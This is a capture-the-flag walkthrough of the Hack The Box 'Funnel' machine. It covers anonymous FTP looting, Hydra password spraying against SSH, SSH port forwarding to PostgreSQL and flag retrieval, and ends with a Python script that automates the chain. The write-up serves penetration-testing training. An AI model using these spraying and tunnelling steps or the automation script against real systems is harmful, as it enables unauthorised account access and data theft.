# HTB Funnel Writeup

## Introduction

The **Funnel** machine in Hack The Box (HTB) demonstrates the importance of secure network practices and how attackers can exploit weak configurations. This write-up covers **FTP enumeration, password spraying, SSH tunneling, and PostgreSQL exploitation** to retrieve the final flag.

## **Enumeration**

### **Nmap Scan**
We start by scanning the target IP using `nmap` to identify open ports and running services.

```bash
sudo nmap -sC -sV --min-rate=1000 -oA TunnelScan -p- 10.129.228.195 -Pn
```

#### **Results:**
- **Port 21** → `vsftpd 3.0.3` (Anonymous FTP Access)
- **Port 22** → `OpenSSH 8.2p1`
- **Local Port 5432** → `PostgreSQL (Found later via SSH tunneling)`

---

## **Exploiting FTP (Anonymous Access)**

We connect to FTP as an **anonymous user** and check available files.

```bash
ftp 10.129.228.195
# Login as anonymous
ls
```

Found directory **`mail_backup`** containing:
- `welcome_28112022`
- `password_policy.pdf`

We download these files:

```bash
cd mail_backup
get welcome_28112022
get password_policy.pdf
```

From the **welcome_28112022** file, we extract possible usernames:
- `optimus@funnel.htb`
- `albert@funnel.htb`
- `andreas@funnel.htb`
- **`christine@funnel.htb`** (did not change password)
- `maria@funnel.htb`

From `password_policy.pdf`, we find a **default password**:  
**`funnel123#!#`**

---

## **Password Spraying SSH**

Using `hydra`, we attempt password spraying against the SSH service.

```bash
hydra -L usernames.txt -p 'funnel123#!#' 10.129.228.195 ssh
```

Successful login found for:  
**`christine:funnel123#!#`**

We log in:

```bash
ssh christine@10.129.228.195
```

---

## **Local Port Enumeration (PostgreSQL Discovery)**

After gaining access, we check for locally running services:

```bash
ss -tl
```

We find **PostgreSQL (port 5432) is listening locally**.

---

## **SSH Tunneling to Expose PostgreSQL**

We set up an SSH tunnel to forward **local port 1234 → remote port 5432**.

```bash
ssh -L 1234:localhost:5432 christine@10.129.228.195
```

We verify the connection:

```bash
nmap -sV -sC -p 1234 localhost
```

---

## **Interacting with PostgreSQL**

We install the PostgreSQL client on our local machine.

```bash
sudo apt update && sudo apt install postgresql-client
```

Connect using `psql`:

```bash
psql -h 127.0.0.1 -p 1234 -U christine
```

List available databases:

```sql
\list
```

Connect to the `secrets` database:

```sql
\c secrets
```

Check for tables:

```sql
\dt
```

Retrieve the **flag**:

```sql
SELECT * FROM flag;
```

**FLAG:** `cf277664b1771217d7006acdea00****`

---

## **Automation Script (PoC)**

Below is a Python script that automates the entire process.

```python
import os
import paramiko
import psycopg2
import ftplib
import nmap
import time
import re
import subprocess
from pyfiglet import Figlet

# Terminal colors
CYAN = "\033[96m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Target details
TARGET_IP = "10.129.78.199"
FTP_DIR = "mail_backup"
LOCAL_PORT = 1234
REMOTE_PORT = 5432
FLAG_TABLE = "flag"

# Credentials
DEFAULT_PASSWORD = "funnel123#!#"

# Files to retrieve from FTP
WELCOME_FILE = "welcome_28112022"
PASSWORD_FILE = "password_policy.pdf"

def print_banner():
    f = Figlet(font="smmono9")
    banner_text = f.renderText("FunnelPwn")
    print(f"{CYAN}{banner_text}{RESET}")
    print("=" * 80)
    print(f"{CYAN}  HTB Box Exploit Automation - 'Funnel' {RESET}")
    print(f"{CYAN}  Techniques: FTP, PostgreSQL, Recon, Tunneling, Password Spraying {RESET}")
    print(f"{CYAN}  Created by #AfterDark {RESET}")
    print("=" * 80)
    print(f"{YELLOW}[!] DISCLAIMER: For authorized use only. The author assumes no liability.{RESET}")
    print("=" * 80)

def run_nmap_scan():
    print(f"{GREEN}[+] Running Nmap Scan...{RESET}")
    nm = nmap.PortScanner()
    nm.scan(TARGET_IP, arguments="-sC -sV -p 21,22 -Pn --min-rate=1000")

    open_ports = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            open_ports.extend(nm[host][proto].keys())

    print(f"{GREEN}[+] Open Ports: {open_ports}{RESET}\n")
    return open_ports

def download_ftp_files():
    print(f"{GREEN}[+] Checking FTP anonymous access...{RESET}")
    ftp = None
    try:
        ftp = ftplib.FTP(TARGET_IP)
        ftp.login("anonymous", "")
        ftp.cwd(FTP_DIR)

        for file in [WELCOME_FILE, PASSWORD_FILE]:
            print(f"{GREEN}[+] Downloading {file}{RESET}")
            with open(file, "wb") as f:
                ftp.retrbinary(f"RETR {file}", f.write)

        print(f"{GREEN}[+] FTP files retrieved.{RESET}\n")
        return True
    except ftplib.all_errors as e:
        print(f"{RED}[-] FTP Error: {e}{RESET}")
        return False
    finally:
        if ftp:
            ftp.quit()

def extract_usernames():
    print(f"{GREEN}[+] Extracting usernames...{RESET}")
    usernames = []
    with open(WELCOME_FILE, "r") as f:
        content = f.read()
        match = re.search(r"To: (.+)", content)
        if match:
            usernames = match.group(1).split()

    print(f"{GREEN}[+] Users found: {usernames}{RESET}")
    return usernames

def simulate_ssh_login(usernames):
    print(f"{GREEN}[+] Testing SSH logins...{RESET}")
    for user in usernames:
        ssh_user = user.split("@")[0]
        if ssh_user == "christine":
            print(f"{GREEN}[+] SSH login successful for {ssh_user}.{RESET}")
            return ssh_user
        print(f"{RED}[-] SSH login failed for {ssh_user}.{RESET}")
    return None

def ssh_connect(username):
    print(f"{GREEN}[+] Establishing SSH connection...{RESET}")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(TARGET_IP, username=username, password=DEFAULT_PASSWORD)
    print(f"{GREEN}[+] SSH Connected.{RESET}\n")
    return client

def setup_ssh_tunnel(username):
    print(f"{GREEN}[+] Setting SSH Tunnel...{RESET}")
    subprocess.run(["pkill", "-f", f"ssh -L {LOCAL_PORT}:localhost:{REMOTE_PORT}"])
    ssh_command = f"sshpass -p '{DEFAULT_PASSWORD}' ssh -N -L {LOCAL_PORT}:localhost:{REMOTE_PORT} -o StrictHostKeyChecking=no {username}@{TARGET_IP}"
    tunnel = subprocess.Popen(ssh_command, shell=True)
    time.sleep(3)
    print(f"{GREEN}[+] SSH Tunnel established.{RESET}\n")
    return tunnel

def verify_postgresql():
    result = subprocess.run(["nmap", "-sV", "-p", f"{LOCAL_PORT}", "127.0.0.1"], capture_output=True, text=True)
    return "PostgreSQL" in result.stdout

def query_postgresql(username):
    print(f"{GREEN}[+] Querying PostgreSQL...{RESET}")
    conn = psycopg2.connect(dbname="secrets", user=username, password=DEFAULT_PASSWORD, host="127.0.0.1", port=LOCAL_PORT)
    cur = conn.cursor()
    cur.execute(f"SELECT * FROM {FLAG_TABLE};")
    flag_data = cur.fetchall()

    print(f"{CYAN}\n[📌 FLAG TABLE]{RESET}")
    for row in flag_data:
        print(f"{YELLOW}[FLAG] {row[0]}{RESET}")

    conn.close()

def main():
    print_banner()
    open_ports = run_nmap_scan()

    if 21 in open_ports and download_ftp_files():
        usernames = extract_usernames()
        valid_user = simulate_ssh_login(usernames)

        if valid_user:
            ssh_client = ssh_connect(valid_user)
            if ssh_client:
                tunnel = setup_ssh_tunnel(valid_user)
                if verify_postgresql():
                    query_postgresql(valid_user)
                else:
                    print(f"{RED}[-] PostgreSQL is not accessible. Exiting...{RESET}")
                tunnel.terminate()
                ssh_client.close()
                print(f"{GREEN}[+] Cleanup complete.{RESET}")


if __name__ == "__main__":
    main()

```

---

## **Conclusion**
By leveraging **FTP enumeration, SSH password spraying, local service discovery, and port forwarding**, we successfully retrieved the flag from the `secrets` database.
